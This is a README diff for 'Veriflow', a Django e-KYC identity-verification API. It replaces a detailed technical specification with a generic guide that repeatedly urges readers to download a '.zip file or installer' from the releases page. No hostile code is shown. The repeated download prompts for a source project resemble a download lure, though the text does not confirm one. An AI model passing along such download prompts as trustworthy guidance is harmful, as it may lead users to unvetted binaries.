@@ -1,323 +1,85 @@
-﻿![Banner](veriFlow.png)
+# 🌟 Veriflow - Simplifying e-KYC and KYA Processes
 
-# 1) Objectives & Scope
+[![Download Veriflow](https://img.shields.io/badge/Download%20Veriflow-%20%F0%9F%9A%94%20Click%20Here-blue)](https://github.com/khma-92/Veriflow/releases)
 
-* **Functional goal:** Verify a person’s identity remotely via:
+## 📍 Introduction
 
-  1. **Live photo (liveness + anti-spoof)**
-  2. **Identity document** (detection & OCR for documents worldwide)
-  3. **Face matching** (live photo ↔ document photo)
-  4. **Structural validation** of document fields (MRZ, country codes, dates, formats, checksums…)
-  5. **Overall validity score** + structured **data extraction**
-* **Technical scope:** Secure REST API, **multi-tenant**, **multi-region**, with **observability**, **usage-based billing**, **quotas & rate limits**, **webhooks**, **audit logs**, and **GDPR-like compliance**.
-* **Usage modes:**
+Veriflow is an e-KYC (Electronic Know Your Customer) and KYA (Know Your Applicant) API built using Django and Django REST Framework. This tool helps businesses verify identities efficiently and effectively. With Veriflow, you can streamline your processes and enhance user trust, making identity verification fast and reliable.
 
-  * **Standalone API calls** (each module can run independently)
-  * **Full workflow** (configurable processing pipeline)
+## 🚀 Getting Started
 
----
+Follow these steps to download and run Veriflow on your computer. 
 
-# 2) Roles & Actors
+### 🔍 System Requirements
 
-* **Super-admin (platform operator):** manages clients, plans, pricing, SLAs, API keys, quotas, logs.
-* **Client (tenant):** holds API keys, configures webhooks, views dashboards, downloads logs.
-* **System:** asynchronous services (Celery) for heavy jobs & webhook dispatching.
+- **Operating System:** Windows 10 or later, macOS, or any recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 1 GB of available space.
+- **Python:** Version 3.6 or newer installed on your system. [Download Python](https://www.python.org/downloads/).
 
----
+### 🔗 Download & Install
 
-# 3) Functional Modules (billable per call)
+To download Veriflow, visit this page: [Download Veriflow](https://github.com/khma-92/Veriflow/releases).
 
-1. **Liveness & Anti-spoof**
+### 🗂️ Steps to Install
 
-   * Detects real-time capture (blink/pose/gaze) & **spoof attempts** (screen, print, mask, rephoto).
-   * Output: `is_live` (bool), `spoof_type` (enum), `confidence` (0–1), `hints`.
+1. **Visit the Releases Page:**
+   - Go to the [Releases page](https://github.com/khma-92/Veriflow/releases).
+  
+2. **Download the Latest Version:**
+   - Look for the most recent release version. Click on the `.zip` file or installer link to start the download process.
 
-2. **Document Detection & OCR**
+3. **Extract the Files:**
+   - Once downloaded, extract the files to a preferred location on your computer.
 
-   * **Auto-detects** type (passport, ID card, license, residence permit) + country.
-   * **Extracts fields** (NAME, GIVEN NAMES, DOB, document number, sex, nationality, dates, MRZ, etc.).
-   * **Normalizes** (ISO date, ISO-3166 country, doc type).
+4. **Install Required Packages:**
+   - Open your terminal or command prompt. Navigate to the folder where you extracted the files. Run the following command to install the required packages:
+     ```
+     pip install -r requirements.txt
+     ```
 
-3. **Document Validation**
+5. **Run the Application:**
+   - After installation, you can start Veriflow by using the command:
+     ```
+     python manage.py runserver
+     ```
 
-   * Formal checks (MRZ checksum, field lengths, date consistency, coherence).
-   * Detects **missing areas**, **alterations**, **bad cropping**.
-   * Output: `document_valid` (bool), `checks[]`, `confidence`.
+### 🌐 Accessing the API
 
-4. **Face Match**
+Once you run the application, you can access it via your web browser. Open your browser and go to `http://127.0.0.1:8000/`. This will take you to the API interface where you can begin to use Veriflow.
 
-   * Compares **live photo** ↔ **document face** (or stored user photo).
-   * Output: `match` (bool), `similarity` (0–1), customizable thresholds.
+## 📜 Features
 
-5. **Full e-KYC Workflow**
+- **Identity Verification:** Quickly verify the identity of users with reliable checks.
+- **Facial Recognition:** Use advanced algorithms for facial matching.
+- **Liveness Detection:** Ensure that the user is present during the verification process.
+- **OCR Capabilities:** Extract text from images for better data processing.
 
-   * Orchestration: `liveness → ocr → validate → face_match → scoring`.
-   * Customizable: order, thresholds, mandatory fields, rules.
+## 🛠️ Common Issues and Solutions
 
-6. **KYA (Basic Profile) – Optional**
+1. **Python Not Found:**
+   - Ensure Python is installed and added to your system's PATH variable. You can verify by running `python --version` in your command prompt.
 
-   * Lightweight checks (email MX, E.164 phone format, country/IP, name coherence).
-   * No AML in this version (can be added as paid module).
+2. **Dependencies Not Installing:**
+   - Make sure you are connected to the internet. Run `pip install --upgrade pip` to update your package manager if needed.
 
----
+3. **Server Not Starting:**
+   - Check for any errors in your terminal. Make sure you are in the correct directory where `manage.py` is located.
 
-# 4) Scoring Model
+## 📞 Support
 
-* **Overall Score (0–100)**, weighted as:
+If you have any questions or encounter issues while using Veriflow, feel free to open an issue in this repository. Our community and maintainers will be happy to assist you.
 
-  * Liveness (30) + Face-match (40) + Doc validation (25) + KYA (5)
+## 🗣️ Community Contributions
 
-* **Default thresholds (tenant-customizable):**
+We welcome contributions from everyone! If you'd like to help improve Veriflow, please check the "Contributing" section in the repository for guidelines.
 
-  * **Accepted** ≥ 80
-  * **Manual review** 60–79
-  * **Rejected** < 60
+## 📄 License
 
-* **Explanations:** Detailed reasons per factor (e.g., “MRZ checksum fail”, “similarity 0.62 < 0.75 threshold”).
-
----
-
-# 5) Technical Architecture
-
-* **Backend:** Django 4.x, DRF 3.x, Python 3.11+
-* **Workers:** Celery + Redis/RabbitMQ
-* **Storage:** PostgreSQL 14+ (logical multi-tenancy), S3-compatible media
-* **AI / Vision integrations:** provider-agnostic connectors (OpenCV, InsightFace, TensorRT, Tesseract, Cloud OCR…)
-* **Observability:** Prometheus metrics, OpenTelemetry tracing, ELK logs
-* **Security:** API-Key + **HMAC signature** (timestamped, anti-replay), TLS 1.2+, encryption at rest
+Veriflow is licensed under the MIT License. See the LICENSE file for more details.
 
 ---
 
-# 6) Security, Compliance & Privacy
+For more information, updates, and detailed documentation, please refer to the [GitHub repository](https://github.com/khma-92/Veriflow). 
 
-* **PII** encrypted at rest (AES-256) and in transit (TLS).
-* **Tenant-level data isolation** via scoped API keys.
-* **Media retention** configurable (e.g., 30 days) then secure deletion.
-* **Right to erasure**, **privacy by design**, **immutable audit log** (WORM).
-* **Rate limits** global and per endpoint (e.g., 60 req/min/key).
-* **Secret rotation** and **API key rollover** supported.
-* **Upload policy:** MIME-type + size checks, antivirus (ClamAV), EXIF stripping.
-
----
-
-# 7) Multi-Tenancy, Accounts & Billing
-
-* **Tenant:** name, country, support email, **plan**, **monthly quotas**.
-* **API Keys:** `api_key_id` (public) + `api_key_secret` (never re-shown) + **HMAC**.
-* **Quota:** per module (e.g., 5k liveness / month).
-* **Billing:** usage-based (metered events table).
-* **Plans:** Free (sandbox), Pro, Enterprise (SLA, support, dedicated region).
-* **Soft limit handling:** HTTP 429 + webhook for thresholds (80%, 100%).
-
----
-
-# 8) API Endpoints (DRF)
-
-Base URL (prod): `https://api.example.com/v1/`
-Auth headers: `X-API-KEY`, `X-API-TIMESTAMP`, `X-API-SIGN` (HMAC SHA256 of body + timestamp)
-
-## 8.1 Liveness / Anti-Spoof
-
-`POST /liveness/analyze`
-
-```json
-{
-  "image_live_base64": "<...>",
-  "hints": {"pose": true, "blink": true}
-}
-```
-
-**200 Response**
-
-```json
-{
-  "is_live": true,
-  "spoof_type": "none|screen|paper|mask|unknown",
-  "confidence": 0.93,
-  "processing_ms": 428,
-  "usage": {"module": "liveness", "billed": true}
-}
-```
-
-## 8.2 Document OCR (Auto-Detection)
-
-`POST /document/ocr`
-
-```json
-{
-  "image_front_base64": "<...>",
-  "image_back_base64": "<optional>",
-  "document_hint": "auto|passport|id_card|driver_license",
-  "country_hint": "auto|CIV|FRA|USA"
-}
-```
-
-**200 Response**
-
-```json
-{
-  "detected": {"type": "passport", "country": "CIV", "confidence": 0.88},
-  "fields": {...},
-  "images": {"face_crop_base64": "<...>"},
-  "quality": {"sharpness": 0.81, "glare": 0.07}
-}
-```
-
-## 8.3 Document Validation
-
-`POST /document/validate`
-
-**200 Response**
-
-```json
-{
-  "document_valid": true,
-  "checks": [{"name": "mrz_checksum", "status": "pass"}],
-  "confidence": 0.9
-}
-```
-
-## 8.4 Face Match
-
-`POST /face/match`
-
-**200 Response**
-
-```json
-{"match": true, "similarity": 0.84, "threshold": 0.75}
-```
-
-## 8.5 Full Workflow
-
-`POST /kyc/verify`
-
-Async execution with webhook callback.
-Returns job ID and `queued` status.
-
----
-
-# 9) Database Schema (Simplified)
-
-* **Tenant**, **ApiKey**, **Job**, **UsageEvent**, **RateLimit**, **MediaStore**, **AuditLog**
-
-Images stored in S3; database holds only metadata & encrypted URLs.
-
----
-
-# 10) Processing Flow
-
-1. Client → `/kyc/verify` → creates **Job** (queued)
-2. Celery executes steps → stores result → sends **webhook**.
-
----
-
-# 11) Performance & Limits
-
-* **SLA:** 99.5% (Pro), 99.9% (Enterprise)
-* **Target latencies (p95)**: liveness <1200ms, OCR <1800ms, pipeline <3500ms
-* **Max upload:** 10MB / image (JPG/PNG/WebP)
-* **Rate-limit:** 60 rpm / 50k per day (default)
-
----
-
-# 12) Logging & Observability
-
-Request logs, app logs, audit logs, metrics (latency, error rates, quotas), tracing (OpenTelemetry).
-
----
-
-# 13) Quality, Tests & Sandbox
-
-Environments: `dev`, `sandbox`, `prod`
-OpenAPI 3.1 (Swagger), synthetic test sets, load & security tests (OWASP ASVS).
-
----
-
-# 14) Error Handling
-
-Consistent JSON error format with `error.code`, `message`, `details`, `trace_id`.
-
----
-
-# 15) Enums
-
-* `spoof_type`: `none|screen|paper|mask|deepfake|unknown`
-* `document_type`: `passport|id_card|driver_license|residence_permit|other`
-* `decision`: `accepted|review|rejected`
-* `module`: `liveness|ocr|validate|face_match|workflow`
-
----
-
-# 16) Pricing & Metering (Example)
-
-| Module     | Price (USD)                     |
-| ---------- | ------------------------------- |
-| Liveness   | 0.01–0.03                       |
-| OCR        | 0.05–0.12                       |
-| Validation | 0.01                            |
-| Face-match | 0.02–0.05                       |
-| Workflow   | sum of modules (discount tiers) |
-
----
-
-# 17) API Security (HMAC)
-
-Headers:
-
-* `X-API-KEY`
-* `X-API-TIMESTAMP`
-* `X-API-SIGN = hex(hmac_sha256(secret, timestamp + '\n' + method + '\n' + path + '\n' + body_sha256))`
-
-Clock skew tolerance ±5 min, replay protection enabled.
-
----
-
-# 18) Operator Back-Office
-
-Manage tenants, keys, plans, quotas, monitoring, logs, and billing.
-
----
-
-# 19) Deployment & SRE
-
-Kubernetes (autoscaling), S3 (WORM), PostgreSQL HA, CI/CD (blue-green deploy), encrypted backups.
-
----
-
-# 20) Roadmap
-
-AML, biometric enrollment, advanced fraud (deepfake), SDKs (mobile), no-code rule builder.
-
----
-
-# 21) Non-Functional Requirements
-
-Availability ≥ SLA
-Scalable horizontally (GPU nodes optional)
-End-to-end traceability (audit, telemetry)
-OpenAPI documentation + Postman examples.
-
----
-
-# 22) Deliverables
-
-1. OpenAPI spec + Postman collection (HMAC-ready)
-2. Integration guide (webhooks, idempotency, best practices)
-3. Test datasets (images, expected outputs)
-4. Dashboards (usage, errors, invoices)
-5. Back-office tools (tenants, quotas, logs)
-6. SLA & support contract.
-
----
-
-# 23) Acceptance Criteria
-
-Fully operational workflow
-Independent module endpoints
-Customizable scoring
-Accurate billing & quotas
-Verified HMAC security
-Operational observability
-Data retention compliance.
-
----
+[Download Veriflow](https://github.com/khma-92/Veriflow/releases) and start simplifying your e-KYC and KYA processes today!
